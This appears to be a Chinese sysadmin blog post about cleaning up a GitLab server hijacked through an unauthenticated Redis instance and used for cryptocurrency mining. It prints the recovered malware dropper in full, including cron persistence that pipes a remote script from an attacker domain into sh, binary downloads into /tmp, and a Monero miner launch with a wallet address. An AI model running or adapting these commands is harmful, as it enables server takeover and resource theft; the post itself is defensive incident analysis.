<!DOCTYPE html>
<html>

<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<meta name="theme-color" content="#33474d">
	<title>gitlabç½‘ç«™è¢«é»‘redisè¢«åŠ«æŒ6379ç«¯å£éœ€è¦æäº¤è®¤è¯ï¼Œå¦‚ä½•æŒ½æ•‘ï¼Ÿ | Yancy&#39;s blog</title>
	<link rel="stylesheet" href="/css/style.css" />
	
      <link rel="alternate" href="/atom.xml" title="Yancy&#39;s blog" type="application/atom+xml">
    
</head>

<body>

	<header class="header">
		<nav class="header__nav">
			
				<a href="/" class="header__link">Home</a>
			
				<a href="/tags" class="header__link">Tags</a>
			
				<a href="/archives" class="header__link">ARCHIVES</a>
			
				<a href="/about/About" class="header__link">ABOUT</a>
			
				<a href="http://weibo.com/yangcvo" class="header__link">Weibo</a>
			
				<a href="/atom.xml" class="header__link">RSS</a>
			
		</nav>
		<h1 class="header__title"><a href="/">Yancy&#39;s blog</a></h1>
		<h2 class="header__subtitle">SIMPLICITY IS PREREQUISITE FOR  RELIABILITY</h2>
	</header>

	<main>
		<article>
	
		<h1>gitlabç½‘ç«™è¢«é»‘redisè¢«åŠ«æŒ6379ç«¯å£éœ€è¦æäº¤è®¤è¯ï¼Œå¦‚ä½•æŒ½æ•‘ï¼Ÿ</h1>
	
	<div class="article__infos">
		<span class="article__date">2016-12-02</span><br />
		
			<span class="article__category">
				<a class="article-category-link" href="/categories/è¿ç»´å®‰å…¨/">è¿ç»´å®‰å…¨</a>
			</span><br />
		
		
			<span class="article__tags">
			  	<a class="article__tag-link" href="/tags/Operation-safety/">Operation safety</a>
			</span>
		
	</div>

	

	
		<p>ä»Šå¤©æ—©ä¸Š5ç‚¹å¤šæ”¶åˆ°é˜¿é‡Œäº‘çš„å‘Šè­¦ï¼šæœåŠ¡å™¨CPUç™¾åˆ†ç™¾ï¼ŒgitlabæœåŠ¡å™¨è®¿é—®å‡ºç°500ï¼Œç¬¬ä¸€æ—¶é—´æ’æŸ¥é—®é¢˜ã€‚<br>æ¯•ç«Ÿè¿™ä¸ªå…³ä¹ç€å¼€å‘ä»Šå¤©å¯èƒ½æ— æ³•æäº¤ä»£ç ã€‚</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_01.png" alt=""></figure><br><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_02.png" alt=""></figure></p>
<h4 id="ç¬¬ä¸€æ—¶é—´æˆ‘æŸ¥çœ‹ä»€ä¹ˆåŸå› å¯¼è‡´æˆ‘gitlab-500ã€‚"><a href="#ç¬¬ä¸€æ—¶é—´æˆ‘æŸ¥çœ‹ä»€ä¹ˆåŸå› å¯¼è‡´æˆ‘gitlab-500ã€‚" class="headerlink" title="ç¬¬ä¸€æ—¶é—´æˆ‘æŸ¥çœ‹ä»€ä¹ˆåŸå› å¯¼è‡´æˆ‘gitlab 500ã€‚"></a>ç¬¬ä¸€æ—¶é—´æˆ‘æŸ¥çœ‹ä»€ä¹ˆåŸå› å¯¼è‡´æˆ‘gitlab 500ã€‚</h4><p>æ ¹æ®ä»¥å¾€ç»éªŒgitlabå‡ºç°500 ç¬¬ä¸€ï¼šç‰ˆæœ¬å‡ºç°bugï¼Œç¬¬äºŒï¼šæœåŠ¡å™¨ç½‘ç»œä¸æ­£å¸¸ï¼Œè¯·æ±‚ä¸åˆ°ã€‚</p>
<p>ç„¶åæŸ¥çœ‹æ—¥å¿—ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[root@GitLab ~]<span class="comment"># tailf -1000 /home/git/gitlab/log/production.log</span></div><div class="line"></div><div class="line">Started POST <span class="string">"//api/v3/internal/allowed"</span> <span class="keyword">for</span> 139.129.22.17 at 2017-01-06 10:14:26 +0800</div><div class="line">Started POST <span class="string">"//api/v3/internal/allowed"</span> <span class="keyword">for</span> 139.129.22.17 at 2017-01-06 10:14:31 +0800</div><div class="line">Started POST <span class="string">"//api/v3/internal/allowed"</span> <span class="keyword">for</span> 139.129.22.17 at 2017-01-06 10:14:37 +0800</div><div class="line">Started POST <span class="string">"//api/v3/internal/allowed"</span> <span class="keyword">for</span> 139.129.22.17 at 2017-01-06 10:14:42 +0800</div><div class="line">Started POST <span class="string">"//api/v3/internal/allowed"</span> <span class="keyword">for</span> 139.129.22.17 at 2017-01-06 10:15:35 +0800</div><div class="line">Started GET <span class="string">"/"</span> <span class="keyword">for</span> 177.154.56.233 at 2017-01-06 10:15:55 +0800</div><div class="line">Processing by DashboardController<span class="comment">#show as */*</span></div><div class="line">Completed 401 Unauthorized <span class="keyword">in</span> 55ms</div><div class="line"></div><div class="line">Redis::CommandError (NOAUTH Authentication required.):</div><div class="line">  config/initializers/redis-store-fix-expiry.rb:10:<span class="keyword">in</span> `block <span class="keyword">in</span> setex<span class="string">'</span></div><div class="line">  config/initializers/redis-store-fix-expiry.rb:10:in `setterâ€™</div></pre></td></tr></table></figure>
<p>è¿™é‡Œæç¤ºRediséœ€è¦è®¤è¯ï¼Œ<code>Redis::CommandError (NOAUTH Authentication required.)</code>:è¿™é‡Œå½“åˆå°±æ²¡æœ‰è®¤è¯çš„ï¼Œçªç„¶éœ€è¦è®¤è¯ï¼Œæ˜æ˜¾è¢«äººé»‘äº†ã€‚</p>
<p>å› ä¸ºredisæœåŠ¡åœ¨2016å¹´3æœˆä»½å®˜ç½‘å‘å¸ƒäº†ä¸€é¡¹é€šçŸ¥ï¼šä½¿ç”¨redisä¸»è¦è®¾ç½®å¯†ç ã€‚<br>å¯ä»¥çœ‹ä¸‹è¿™ç¯‡æ–‡ç« ï¼š</p>
<p><a href="http://www.oschina.net/news/67975/redis-defect?from=mail-notify" target="_blank" rel="external">Redis æœªæˆæƒè®¿é—®ç¼ºé™·å¯è½»æ˜“å¯¼è‡´ç³»ç»Ÿè¢«é»‘</a></p>
<p>å…¨çƒæ— éªŒè¯å¯ç›´æ¥åˆ©ç”¨ Redis TOP 10 å›½å®¶ä¸åœ°åŒº</p>
<p><figure class="figure"><img src="http://static.oschina.net/uploads/space/2015/1112/131046_hoNL_865233.jpg" alt=""></figure></p>
<p>è§£å†³æ–¹æ¡ˆ</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">ä¸´æ—¶è§£å†³æ–¹æ¡ˆ                            </div><div class="line"></div><div class="line">é…ç½®<span class="keyword">bindé€‰é¡¹, </span>é™å®šå¯ä»¥è¿æ¥RedisæœåŠ¡å™¨çš„IP, å¹¶ä¿®æ”¹redisçš„é»˜è®¤ç«¯å£<span class="number">6379</span>.</div><div class="line"></div><div class="line">é…ç½®AUTH, è®¾ç½®å¯†ç , å¯†ç ä¼šä»¥æ˜æ–‡æ–¹å¼ä¿å­˜åœ¨redisé…ç½®æ–‡ä»¶ä¸­.</div><div class="line"></div><div class="line">é…ç½®rename-command <span class="built_in">CONFIG</span> <span class="string">"RENAME_CONFIG"</span>, è¿™æ ·å³ä½¿å­˜åœ¨æœªæˆæƒè®¿é—®, ä¹Ÿèƒ½å¤Ÿç»™æ”»å‡»è€…ä½¿ç”¨<span class="built_in">config</span>æŒ‡ä»¤åŠ å¤§éš¾åº¦</div><div class="line"></div><div class="line">å¥½æ¶ˆæ¯æ˜¯Redisä½œè€…è¡¨ç¤ºå°†ä¼šå¼€å‘â€real userâ€ï¼ŒåŒºåˆ†æ™®é€šç”¨æˆ·å’Œadminæƒé™ï¼Œæ™®é€šç”¨æˆ·å°†ä¼šè¢«ç¦æ­¢è¿è¡ŒæŸäº›å‘½ä»¤ï¼Œå¦‚<span class="built_in">config</span></div><div class="line"></div><div class="line">å®˜æ–¹è§£å†³æ–¹æ¡ˆ                            </div><div class="line"></div><div class="line">æš‚æ— å®˜æ–¹è§£å†³æ–¹æ¡ˆ</div></pre></td></tr></table></figure>
<p>ç°åœ¨ç‰ˆæœ¬gitlab 7.0ç‰ˆæœ¬çš„æ²¡æœ‰redisè®¾ç½®å¯†ç ä¸€é¡¹ï¼Œæ‰€ä»¥å°±è§‰å¾—å¥‡æ€ªï¼Œä¸ºä»€ä¹ˆä¼šæœ‰äººè®¾ç½®äº†å¯†ç ï¼Œç½‘ç«™å¯¼è‡´è·å–ä¸åˆ°æ•°æ®å°±å‡ºç°500äº†ã€‚</p>
<h4 id="æŸ¥æ‰¾åŸå› ï¼šä»€ä¹ˆåŸå› å¯¼è‡´CPUä¸€ç›´100"><a href="#æŸ¥æ‰¾åŸå› ï¼šä»€ä¹ˆåŸå› å¯¼è‡´CPUä¸€ç›´100" class="headerlink" title="æŸ¥æ‰¾åŸå› ï¼šä»€ä¹ˆåŸå› å¯¼è‡´CPUä¸€ç›´100%"></a>æŸ¥æ‰¾åŸå› ï¼šä»€ä¹ˆåŸå› å¯¼è‡´CPUä¸€ç›´100%</h4><p>é¦–å…ˆSSHç™»é™†ï¼ŒtopæŸ¥çœ‹è¿›ç¨‹ï¼Œå‘ç°å¥‡æ€ªåå­—çš„å‘½ä»¤AnXqV, ddg.217éšè—è¿›ç¨‹ã€‚ è¿˜æœ‰ä¸€çœ‹å°±æ„Ÿè§‰æœ‰é—®é¢˜ã€‚</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_03.png" alt=""></figure></p>
<p>çŸ¥é“è¿™ä¸ªè¿›ç¨‹ç„¶åæˆ‘ä»¬å•ç‹¬çœ‹ä¸‹è¿™ä¸ªè¿›ç¨‹å…·ä½“æœ‰å“ªäº›ï¼š<br><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_04.png" alt=""></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsof â€“c ddg.217</div></pre></td></tr></table></figure>
<p>æŸ¥çœ‹å…³è”æ–‡ä»¶ï¼Œå‘ç°å¯¹å¤–çš„tcpè¿æ¥ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯åå‘shellâ€¦</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_05.png" alt=""></figure></p>
<p>ä»è¿™é‡Œæ˜æ˜¾å¯ä»¥çœ‹çš„å‡ºæ¥ï¼Œæˆ‘çš„redis-6379 è¢«äººæ‹¿åˆ°shellæƒé™äº†ã€‚</p>
<p>ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼š</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_06.png" alt=""></figure></p>
<p>è¿™é‡Œæˆ‘åˆ°/root/.ddg/17.dbè¿™ä¸ªæ–‡ä»¶æˆ‘æ‰“å¼€çœ‹æ˜¯ä¹±ç åŠ å¯†è¿‡çš„ã€‚<br>åŠ å¯†çš„ çœ‹ä¸åˆ°æ•°æ®ã€‚<br><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_07.png" alt=""></figure></p>
<h6 id="è¿™é‡Œç¬¬ä¸€æ­¥åˆ é™¤ç¬¬ä¸€ä¸ªç—…æ¯’æ–‡ä»¶å’ŒåŠ æƒé™ä½ï¼š"><a href="#è¿™é‡Œç¬¬ä¸€æ­¥åˆ é™¤ç¬¬ä¸€ä¸ªç—…æ¯’æ–‡ä»¶å’ŒåŠ æƒé™ä½ï¼š" class="headerlink" title="è¿™é‡Œç¬¬ä¸€æ­¥åˆ é™¤ç¬¬ä¸€ä¸ªç—…æ¯’æ–‡ä»¶å’ŒåŠ æƒé™ä½ï¼š"></a>è¿™é‡Œç¬¬ä¸€æ­¥åˆ é™¤ç¬¬ä¸€ä¸ªç—…æ¯’æ–‡ä»¶å’ŒåŠ æƒé™ä½ï¼š</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rm -rf /root/.ddg  åˆ é™¤ä¾èµ–ã€‚ä»–ä¾èµ–äºå“ªä¸ªæ–‡ä»¶ï¼Œç„¶åç»™åŠ ä¸€ä¸ªæƒé™ä½ï¼šchattr  +s  filename</div><div class="line">åˆ é™¤æ‰äº† ä½ æ‰‹åŠ¨åˆ›å»ºï¼Œç„¶ååŠ æƒé™ä½ã€‚</div></pre></td></tr></table></figure>
<h6 id="ç¬¬äºŒæ­¥åˆ†æä¸‹é¢IPåœ°å€ï¼š"><a href="#ç¬¬äºŒæ­¥åˆ†æä¸‹é¢IPåœ°å€ï¼š" class="headerlink" title="ç¬¬äºŒæ­¥åˆ†æä¸‹é¢IPåœ°å€ï¼š"></a>ç¬¬äºŒæ­¥åˆ†æä¸‹é¢IPåœ°å€ï¼š</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">139.222.173.127</div><div class="line">139.70.199.90</div><div class="line">.....</div><div class="line">åé¢å°±ä¸ç”¨è§£é‡Šäº†ï¼Œè¿™ä¸ªæ˜æ˜¾å½“`è‚‰é¸¡`äº†ã€‚</div></pre></td></tr></table></figure>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_08.png" alt=""></figure></p>
<p>ä¸´æ—¶æ–¹æ³•é˜²ç«å¢™é…ç½®å±è”½è¿™äº›IPåœ°å€ã€‚ æ²»æ ‡ä¸æ²»æœ¬ã€</p>
<p>è¿™é‡Œè§£å†³æ‰<code>12506</code>è¿›ç¨‹ï¼škill -9 12506</p>
<p>é…ç½® ä¸€ä¸ªhosts  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">10.0.1.110   www.haveabitchin.com  é…ç½®æˆ ç™¾åº¦çš„ip</div></pre></td></tr></table></figure>
<p>å¸®ä»–é…é”™åœ°å€,ä»–è‚¯å®šè¯·æ±‚ä¸‹è½½ ä¸åˆ°è¿™ä¸ªè„šæœ¬äº†.</p>
<p>ç„¶åæŒ‰è¿›ç¨‹ç¨‹åºç›®å½•ä¸‹é¢è¿›å…¥/tmp/åˆ é™¤ ddg.217æ–‡ä»¶ï¼Œåˆ é™¤duchduckgo.17.log è¿™ä¸ªæ˜¯ç—…æ¯’è¿è¡Œè¿›ç¨‹è¾“å‡ºçš„æ—¥å¿—æ–‡ä»¶ï¼Œ<br>åˆ é™¤hsperfadata_root è¿™ä¸ªæ–‡ä»¶é‡Œé¢æ˜¯ä¸ªè¿›ç¨‹ï¼Œä¹Ÿåˆ é™¤ã€‚</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_09.png" alt=""></figure></p>
<p>ç„¶ååœ¨çœ‹çœ‹æ˜¯å¦è¿˜æœ‰æ²¡æœ‰è¿™ä¸ªè¿›ç¨‹ï¼š<br>åˆå¯åŠ¨<code>13929</code>è¿™ä¸ªè¿›ç¨‹ï¼ŒæœåŠ¡è¿˜æ˜¯å ç”¨å¾ˆé«˜èµ„æºCPUï¼š100%<br>å®šä½åˆ°æ˜¯å“ªä¸ªç¨‹åº å‘èµ·çš„è¯·æ±‚.æŸ¥çœ‹ï¼š<code>13918</code>è¿™ä¸ªè¿›ç¨‹ï¼š<br><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_10.png" alt=""></figure></p>
<p>ä»è¿™é‡Œæ˜æ˜¾å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™ä¸ªåœ°å€ï¼š</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="regexp">/bin/</span>sh -c curl -fsSL <span class="string">http:</span><span class="comment">//www.haveabitchin.com/pm.sh?0105008 | sh</span></div><div class="line">curl -fsSL <span class="string">http:</span><span class="comment">//www.haveabitchin.com/ddg.x86_64 -o /tmp/ddg.217</span></div></pre></td></tr></table></figure>
<p>è¿™ä¸ªæ˜æ˜¾æ˜¯å“ªä¸ªç¨‹åºä¸€ç›´åœ¨å¯åŠ¨ã€‚</p>
<h5 id="ç¬¬ä¸‰æ­¥ç»§ç»­æ’æŸ¥ï¼š"><a href="#ç¬¬ä¸‰æ­¥ç»§ç»­æ’æŸ¥ï¼š" class="headerlink" title="ç¬¬ä¸‰æ­¥ç»§ç»­æ’æŸ¥ï¼š"></a>ç¬¬ä¸‰æ­¥ç»§ç»­æ’æŸ¥ï¼š</h5><p>åˆ é™¤è¿™äº›å‘ç°è¿˜æ˜¯CPUç™¾åˆ†ç™¾ï¼š<br>åœ¨ç»§ç»­æŸ¥çœ‹è¿›ç¨‹ï¼š</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_11.png" alt=""></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root     26373     1 96 Jan01 ?        4-12:14:03 ./minerd -B <span class="_">-a</span> cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44GpQ3X9aCR5fMfD8myxKQcAYjkTdT5KrM4NM2rM9yWnEkP28mmXu5URUCxwuvKiVCQPZaoYkpxxzKoCpnED6Gmb2wWJRuN -p x</div></pre></td></tr></table></figure>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_12.png" alt=""></figure></p>
<p>è¿™ä¸ªè¿›ç¨‹æ˜¯ä»€ä¹ˆï¼šmined ç™¾åº¦å‘Šè¯‰æˆ‘ä»¬äº†: <a href="https://zhidao.baidu.com/question/1928020622935195267.html" target="_blank" rel="external">minedè‚‰é¸¡æœ¨é©¬</a> å¾ˆåƒCPUä¸€ç§ç—…æ¯’ã€‚</p>
<h5 id="ç¬¬ä¸€æ­¥è§£å†³å®šä½æœ¨é©¬ï¼š"><a href="#ç¬¬ä¸€æ­¥è§£å†³å®šä½æœ¨é©¬ï¼š" class="headerlink" title="ç¬¬ä¸€æ­¥è§£å†³å®šä½æœ¨é©¬ï¼š"></a>ç¬¬ä¸€æ­¥è§£å†³å®šä½æœ¨é©¬ï¼š</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find / -name minerd</div></pre></td></tr></table></figure>
<p>åœ¨æœåŠ¡å™¨æœç´¢æ‰€æœ‰ç›¸å…³minerdæ–‡ä»¶ã€‚<br>æœç´¢åˆ°äº†è¿™ä¸ªæ–‡ä»¶æ”¾åœ¨æˆ‘ä»¬/home/ç›®å½•ä¸‹é¢ã€‚</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_13.png" alt=""></figure></p>
<h5 id="ç¬¬äºŒæ­¥åˆ é™¤æœ¨é©¬ï¼š"><a href="#ç¬¬äºŒæ­¥åˆ é™¤æœ¨é©¬ï¼š" class="headerlink" title="ç¬¬äºŒæ­¥åˆ é™¤æœ¨é©¬ï¼š"></a>ç¬¬äºŒæ­¥åˆ é™¤æœ¨é©¬ï¼š</h5><p>æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡æ˜¯å¦æœ‰å¯åŠ¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[root@GitLab tmp]<span class="comment"># cronte -e</span></div><div class="line">*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh</div></pre></td></tr></table></figure>
<h5 id="æœåŠ¡å™¨æ¢å¤æ­£å¸¸ï¼š"><a href="#æœåŠ¡å™¨æ¢å¤æ­£å¸¸ï¼š" class="headerlink" title="æœåŠ¡å™¨æ¢å¤æ­£å¸¸ï¼š"></a>æœåŠ¡å™¨æ¢å¤æ­£å¸¸ï¼š</h5><p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_14.png" alt=""></figure></p>
<p>æˆ‘è¿™é‡Œå°±è´´å‡ºäº†è¿™ä¸ªæœ¨é©¬çš„è„šæœ¬å†…å®¹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin:/usr/bin:/usr/<span class="built_in">local</span>/bin:/usr/sbin</div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh"</span> &gt; /var/spool/cron/root</div><div class="line">mkdir -p /var/spool/cron/crontabs</div><div class="line"><span class="built_in">echo</span> <span class="string">"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh"</span> &gt; /var/spool/cron/crontabs/root</div><div class="line"></div><div class="line"><span class="keyword">if</span> [ ! <span class="_">-f</span> <span class="string">"/tmp/ddg.217"</span> ]; <span class="keyword">then</span></div><div class="line">    curl -fsSL http://www.haveabitchin.com/ddg.$(uname -m) -o /tmp/ddg.217</div><div class="line"><span class="keyword">fi</span></div><div class="line">chmod +x /tmp/ddg.217 &amp;&amp; /tmp/ddg.217</div><div class="line">killall /tmp/ddg.216</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> [ <span class="_">-d</span> <span class="string">"/opt/yam"</span> ]; <span class="keyword">then</span></div><div class="line">    rm -rf /opt/yam</div><div class="line"><span class="keyword">fi</span></div><div class="line"></div><div class="line">ps auxf|grep -v grep|grep /tmp/duckduckgo|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"/usr/bin/cron"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"/opt/cron"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line"></div><div class="line">â–½</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"/usr/sbin/ntp"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"/opt/minerd"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"mine.moneropool.com"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"xmr.crypto-pool.fr:8080"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line"></div><div class="line"><span class="comment">#/opt/minerd -h</span></div><div class="line"><span class="comment">#if [ $? != "0" ]; then</span></div><div class="line">    <span class="comment">#ps auxf|grep -v grep|grep "/opt/minerd"</span></div><div class="line">    <span class="comment">#if [ $? != "0" ]; then</span></div><div class="line">        <span class="comment">#if [ ! -f /opt/yam ]; then</span></div><div class="line">            <span class="comment">#curl -fsSL http://www.haveabitchin.com/yam -o /opt/yam</span></div><div class="line">        <span class="comment">#fi</span></div><div class="line">        <span class="comment">#chmod +x /opt/yam &amp;&amp; /opt/yam -c x -M stratum+tcp://4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC:x@xmr.crypto-pool.fr:443/xmr</span></div><div class="line">    <span class="comment">#fi</span></div><div class="line"><span class="comment">#fi</span></div><div class="line"></div><div class="line"><span class="function"><span class="title">DoMiner</span></span>()</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> [ ! <span class="_">-f</span> <span class="string">"/tmp/AnXqV"</span> ]; <span class="keyword">then</span></div><div class="line">        curl -fsSL http://www.haveabitchin.com/minerd -o /tmp/AnXqV</div><div class="line">    <span class="keyword">fi</span></div><div class="line">    chmod +x /tmp/AnXqV</div><div class="line">    /tmp/AnXqV -B <span class="_">-a</span> cryptonight -o stratum+tcp://xmr.crypto-pool.fr:443 -u 4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrND<span class="built_in">fg</span>MKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC -p x</div><div class="line">&#125;</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC"</span> || DoMiner</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="title">DoRedis6379</span></span>()</div><div class="line">&#123;</div><div class="line">    iptables -F REDIS6379</div><div class="line">    iptables -A REDIS6379 -p tcp <span class="_">-s</span> 127.0.0.1 --dport 6379 -j ACCEPT</div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 0.0.0.0/8 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 10.0.0.0/8 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 169.254.0.0/16 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 172.16.0.0/12 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 192.168.0.0/16 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 224.0.0.0/4 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    iptables -A REDIS6379 -p TCP --dport 6379 -j REJECT</div><div class="line">    iptables -I INPUT -j REDIS6379</div><div class="line">&#125;</div><div class="line">iptables -D OUTPUT -j REDIS6379</div><div class="line">iptables -F REDIS6379</div><div class="line">iptables -X REDIS6379</div><div class="line">iptables -D INPUT -j REDIS63792</div><div class="line">iptables -F REDIS63792</div><div class="line">iptables -X REDIS63792</div><div class="line"><span class="comment">#iptables -N REDIS6379 &amp;&amp; DoRedis6379</span></div></pre></td></tr></table></figure>
<p>åˆ†æäº†ä¸€ä¸‹ï¼Œå®ƒé™¤äº†è‡ªèº«è¿›ç¨‹å¤–ï¼Œè¿˜æœ‰3ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼Œè€Œä¸”è¿™5ä¸ªè¿›ç¨‹çš„PIDå’Œåç§°æ¯ç§’éƒ½åœ¨å˜åŒ–ï¼Œä¼°è®¡æ˜¯åœ¨ä¸åœçš„é‡å»ºå§ã€‚</p>
<p>ä»¥åŠæ·»åŠ æœåŠ¡å®šæ—¶æ‰§è¡Œè„šæœ¬ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh"</span> &gt; /var/spool/cron/root</div><div class="line">mkdir -p /var/spool/cron/crontabs</div><div class="line"><span class="built_in">echo</span> <span class="string">"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh"</span> &gt; /var/spool/cron/crontabs/root</div></pre></td></tr></table></figure>
<p>ä¸‹è½½ç—…æ¯’æ–‡ä»¶ï¼Œä¸»è¦æ˜¯æˆªå–æˆ‘6379è¿™ä¸ªç«¯å£ï¼Œææƒï¼Œç­‰ç­‰ä¿¡æ¯ï¼Œè¿™ä¸ªæ–‡ä»¶å¯¹æ–¹åšè¿‡åŠ å¯†çš„ã€‚</p>
